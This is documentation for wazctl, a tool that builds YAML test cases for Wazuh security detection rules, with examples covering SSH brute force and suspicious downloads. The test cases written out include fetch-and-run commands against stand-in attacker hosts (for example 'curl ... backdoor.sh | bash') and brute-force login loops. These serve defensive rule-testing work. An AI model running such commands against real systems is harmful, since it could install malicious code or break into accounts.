# 📐 Rule Testing

Rule testing is a core feature of wazctl, allowing you to create structured test cases for your Wazuh security rules. This ensures your rules work as expected across different scenarios.

## 🎯 Overview

wazctl's rule testing framework provides:
- 📝 **Rule Test Templates**: Structured YAML files for test definition
- 🧪 **Test Scenarios**: Multiple test cases per rule ("edges")
- 📋 **Test Documentation**: Self-documenting test files
- 🔄 **Repeatable Testing**: Consistent test execution

> 🚧 **Note**: Rule execution engine is planned for future releases. Currently, wazctl generates test templates for manual testing.

## 🚀 Creating Rule Tests

### Basic Rule Test Creation

Generate a new rule test template:

```bash
wazctl init rule --name "my_security_rule_test"
```

This creates a file named `my_security_rule_test.yaml` with the following structure:

```yaml
ruleId: rule_001
ruleName: Unauthorized Access
ruleAuthor: John Doe
ruleContent: |-
 <rule id="100234" level="3">
    <if_sid>230</if_sid>
    <field name="alert_type">normal</field>
    <description>The file limit set for this agent is $(file_limit). Now, $(file_count) files are being monitored.</description>
   <group>syscheck,fim_db_state,</group>
 </rule>
description: Tests unauthorized access attempts
edges:
  - title: Invalid Login
    description: Simulate invalid login attempt
    command:
      type: bash
      value: |-
       ssh invalid@server
    expected_outcome: Rule triggers alert
```

### Customizing Rule Tests

Edit the generated file to match your specific rule requirements:

```yaml
ruleId: rule_100500
ruleName: SSH Brute Force Detection
ruleAuthor: Security Team
ruleContent: |-
 <rule id="100500" level="10">
    <if_group>authentication_failed</if_group>
    <same_source_ip />
    <different_user />
    <description>Multiple failed SSH login attempts from same IP</description>
    <mitre>
      <id>T1110</id>
    </mitre>
 </rule>
description: Tests SSH brute force attack detection
edges:
  - title: Multiple Failed Logins - Same IP, Different Users
    description: Simulate brute force with multiple usernames
    command:
      type: bash
      value: |-
       for user in admin root test user; do
         ssh $user@target.server.com
         sleep 1
       done
    expected_outcome: Rule triggers alert after 3rd attempt
  
  - title: Single Failed Login
    description: Single failed login should not trigger
    command:
      type: bash
      value: |-
       ssh nonexistent@target.server.com
    expected_outcome: Rule should not trigger
  
  - title: Failed Logins - Different IPs
    description: Failed logins from different IPs should not correlate
    command:
      type: manual
      value: |-
       Test from multiple source IPs:
       - 192.168.1.100: ssh admin@target
       - 192.168.1.101: ssh admin@target
       - 192.168.1.102: ssh admin@target
    expected_outcome: Rule should not trigger (different sources)
```

## 📋 Rule Test Structure

### File Metadata

| Field | Description | Example |
|-------|-------------|---------|
| `ruleId` | Unique rule identifier | `rule_100500` |
| `ruleName` | Human-readable rule name | `SSH Brute Force Detection` |
| `ruleAuthor` | Rule author/team | `Security Team` |
| `ruleContent` | Actual Wazuh rule XML | See examples below |
| `description` | Overall test description | `Tests SSH brute force detection` |

### Edge Cases (Test Scenarios)

Each test scenario includes:

| Field | Description | Example |
|-------|-------------|---------|
| `title` | Test case name | `Multiple Failed Logins` |
| `description` | Detailed test description | `Simulate brute force attack` |
| `command.type` | Command execution type | `bash`, `powershell`, `manual` |
| `command.value` | Commands to execute | Multi-line script |
| `expected_outcome` | Expected rule behavior | `Rule triggers alert` |

### Command Types

#### Bash Commands
```yaml
command:
  type: bash
  value: |-
   # SSH brute force simulation
   for i in {1..5}; do
     ssh admin@192.168.1.100
     sleep 2
   done
```

#### PowerShell Commands
```yaml
command:
  type: powershell
  value: |-
   # Windows login attempts
   1..5 | ForEach-Object {
     net use \\server\share /user:admin wrongpass
     Start-Sleep 2
   }
```

#### Manual Test Instructions
```yaml
command:
  type: manual
  value: |-
   Manual test steps:
   1. Configure agent on Windows machine
   2. Attempt login with wrong credentials
   3. Monitor Wazuh dashboard for alerts
   4. Verify rule triggered with correct level
```

## 🎯 Rule Testing Best Practices

### Comprehensive Test Coverage

Create tests for:

1. **Positive Cases**: Rule should trigger
2. **Negative Cases**: Rule should not trigger  
3. **Edge Cases**: Boundary conditions
4. **False Positives**: Legitimate activity that might trigger
5. **Evasion Attempts**: Ways attackers might bypass

### Example: Complete Rule Test

```yaml
ruleId: rule_100600
ruleName: Suspicious File Download
ruleAuthor: SOC Team
ruleContent: |-
 <rule id="100600" level="8">
    <if_group>web_log</if_group>
    <field name="url">\.exe|\.bat|\.ps1|\.sh</field>
    <field name="response_code">200</field>
    <description>Suspicious executable file download detected</description>
    <mitre>
      <id>T1105</id>
    </mitre>
 </rule>
description: Tests detection of suspicious file downloads
edges:
  # Positive test cases
  - title: EXE File Download
    description: Download executable file
    command:
      type: bash
      value: |-
       curl -o malware.exe http://suspicious.site/malware.exe
    expected_outcome: Rule triggers with level 8
  
  - title: PowerShell Script Download
    description: Download PowerShell script
    command:
      type: bash
      value: |-
       wget http://attacker.com/payload.ps1
    expected_outcome: Rule triggers with level 8
  
  - title: Shell Script Download
    description: Download shell script
    command:
      type: bash
      value: |-
       curl -s http://bad.domain/backdoor.sh | bash
    expected_outcome: Rule triggers with level 8
  
  # Negative test cases
  - title: Image File Download
    description: Download legitimate image file
    command:
      type: bash
      value: |-
       wget http://example.com/image.jpg
    expected_outcome: Rule should not trigger
  
  - title: Failed Download Attempt
    description: Attempt download that fails (404)
    command:
      type: bash
      value: |-
       curl http://example.com/nonexistent.exe
    expected_outcome: Rule should not trigger (non-200 response)
  
  # Edge cases
  - title: Case Sensitivity Test
    description: Test file extension case variations
    command:
      type: bash
      value: |-
       curl -o test.EXE http://example.com/test.EXE
       curl -o test.Exe http://example.com/test.Exe
    expected_outcome: Rule should trigger for both cases
  
  - title: URL Parameter Obfuscation
    description: Test obfuscated file extensions
    command:
      type: bash
      value: |-
       curl "http://example.com/download.php?file=malware.exe&type=binary"
    expected_outcome: Rule should trigger (exe in URL)
```

## 🔧 Test Management

### Organizing Rule Tests

Recommended file organization:

```
rule-tests/
├── authentication/
│   ├── ssh_brute_force_test.yaml
│   ├── failed_login_test.yaml
│   └── privilege_escalation_test.yaml
├── web_attacks/
│   ├── sql_injection_test.yaml
│   ├── xss_detection_test.yaml
│   └── file_upload_test.yaml
├── malware/
│   ├── executable_download_test.yaml
│   ├── suspicious_process_test.yaml
│   └── network_beacon_test.yaml
└── compliance/
    ├── file_integrity_test.yaml
    ├── audit_log_test.yaml
    └── configuration_change_test.yaml
```

### Version Control Integration

```bash
# Initialize git repository for rule tests
git init rule-tests
cd rule-tests

# Create test templates
wazctl init rule --name "authentication_test"
wazctl init rule --name "web_attack_test"
wazctl init rule --name "malware_detection_test"

# Version control your tests
git add *.yaml
git commit -m "Initial rule test templates"
```

### Batch Test Creation

```bash
#!/bin/bash
# Create multiple rule tests

RULES=(
    "ssh_brute_force"
    "failed_login_attempts"
    "privilege_escalation"
    "web_shell_detection"
    "malware_download"
    "data_exfiltration"
)

for rule in "${RULES[@]}"; do
    echo "Creating test for: $rule"
    wazctl init rule --name "${rule}_test"
done
```

## 🧪 Testing Methodologies

### Systematic Testing Approach

1. **Rule Analysis**
   - Understand rule logic
   - Identify trigger conditions
   - Map MITRE ATT&CK techniques

2. **Test Planning**
   - Define test scenarios
   - Plan test data
   - Set up test environment

3. **Test Implementation**
   - Create wazctl test files
   - Write test commands
   - Document expected outcomes

4. **Test Execution**
   - Run tests manually
   - Monitor Wazuh alerts
   - Validate rule behavior

5. **Result Documentation**
   - Record test results
   - Note any issues
   - Update test cases

### Test Environment Setup

For effective rule testing, set up:

```bash
# Local Wazuh environment
wazctl localenv docker --start

# Wait for services to start
sleep 60

# Verify environment
wazctl test auth
wazctl agents list
```

## 📊 Test Documentation

### Test Result Tracking

Create a test results template:

```yaml
# test_results_template.yaml
test_execution:
  date: "2024-01-15T10:30:00Z"
  tester: "security_analyst"
  environment: "local_docker"
  wazuh_version: "4.12.0"

rule_info:
  rule_id: "rule_100500"
  rule_name: "SSH Brute Force Detection"
  test_file: "ssh_brute_force_test.yaml"

results:
  - edge_title: "Multiple Failed Logins"
    status: "PASS"
    notes: "Rule triggered after 3rd attempt as expected"
    alert_level: 10
    
  - edge_title: "Single Failed Login"
    status: "PASS"
    notes: "Rule did not trigger - correct behavior"
    
  - edge_title: "Different IP Sources"
    status: "FAIL"
    notes: "Rule incorrectly triggered - investigate correlation logic"
    issue_created: "WAZUH-1234"

overall_status: "PARTIAL_PASS"
recommendations:
  - "Review IP correlation logic"
  - "Add time window constraints"
  - "Test with higher volume"
```

## 🚧 Planned Features

Future rule testing enhancements:

- **🔄 Automated Test Execution**: Run tests automatically
- **📊 Test Result Reporting**: Generate test reports
- **🎯 Rule Coverage Analysis**: Track test coverage
- **🔗 CI/CD Integration**: Automated testing in pipelines
- **📈 Performance Testing**: Rule performance impact
- **🎭 Attack Simulation**: Automated attack scenarios

## 🛠️ Integration with Development Workflow

### Rule Development Lifecycle

1. **Rule Creation**: Write Wazuh rule
2. **Test Definition**: Create wazctl test file
3. **Test Execution**: Manual testing
4. **Rule Refinement**: Adjust based on test results
5. **Documentation**: Update rule documentation
6. **Deployment**: Deploy to production

### Example Workflow Script

```bash
#!/bin/bash
# Rule development workflow

RULE_NAME=$1
if [ -z "$RULE_NAME" ]; then
    echo "Usage: $0 <rule_name>"
    exit 1
fi

echo "🎯 Starting rule development for: $RULE_NAME"

# Create test template
echo "📝 Creating test template..."
wazctl init rule --name "${RULE_NAME}_test"

# Start local environment
echo "🐳 Starting test environment..."
wazctl localenv docker --start

# Open test file for editing
echo "✏️  Opening test file for editing..."
${EDITOR:-nano} "${RULE_NAME}_test.yaml"

echo "✅ Rule test template created: ${RULE_NAME}_test.yaml"
echo "📋 Next steps:"
echo "   1. Edit the test file with your rule logic"
echo "   2. Define comprehensive test scenarios"
echo "   3. Execute tests manually"
echo "   4. Iterate based on results"
```

## ➡️ Next Steps

- Explore [User Management](users.md)
- Set up [Docker Environment](docker.md)
- Check [Command Reference](command-reference.md)